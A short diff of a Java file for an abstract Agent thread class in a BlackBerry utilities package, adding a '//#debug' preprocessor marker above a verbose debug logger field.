@@ -15,6 +15,7 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 import com.ht.rcs.blackberry.utils.StartStopThread;
 
 public abstract class Agent extends StartStopThread {
+	//#debug
     private static Debug debug = new Debug("Agent", DebugLevel.VERBOSE);
 
     public static final int AGENT = 0x1000;
